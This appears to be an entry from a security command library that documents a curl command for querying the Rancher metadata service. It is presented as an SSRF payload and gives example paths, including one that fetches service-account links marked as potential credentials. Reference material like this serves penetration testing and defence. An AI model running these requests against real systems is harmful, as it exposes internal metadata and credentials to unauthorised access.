---
id: 1c2b6131-96e3-4639-a6e3-369699296273
name: curl-fetch-rancher-metadata
type: command
executor: bash
data: 'curl http://rancher-metadata/$_VERSION/$_PATH'
output: null
created_at: '2023-04-06T03:56:38.795633+00:00'
updated_at: '2023-04-10T20:24:14.039624+00:00'
platforms:
  - Cloud
  - Kubernetes
tags:
  - ssrf
  - metadata-retrieval
verified: true
validated: true
---

# curl-fetch-rancher-metadata

## Command

```bash
curl http://rancher-metadata/$_VERSION/$_PATH
```

## Description

This command retrieves data from the Rancher metadata service, which provides information about the current container or instance in a Rancher-managed Kubernetes environment. It is typically used as a payload in SSRF attacks to access internal metadata from a vulnerable web application running on the same host.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VERSION | Rancher metadata API version (e.g., 2016-07-29, 2015-12-19) | Yes |
| $_PATH | Specific metadata path (e.g., self/container/name, self/ip, self/links/service-accounts) | Yes |

## Examples

### Basic Usage

Fetch the container name:
```bash
curl http://rancher-metadata/2016-07-29/self/container/name
```

### Advanced Usage

Fetch service account links (potential credentials):
```bash
curl http://rancher-metadata/2016-07-29/self/links/service-accounts
```

## Expected Output

Successful execution returns JSON or plain text with instance details, for example:
```
{"name": "container-abc123", "imageUuid": "docker:nginx:latest"}
```
Or for IP:
```
{"address": "10.42.0.5"}
```
Errors (e.g., invalid version) may return 404 or empty responses.

## Related

- [[procedures/Cloud-Instance-Rancher-Metadata-Retrieval-via-SSRF]]
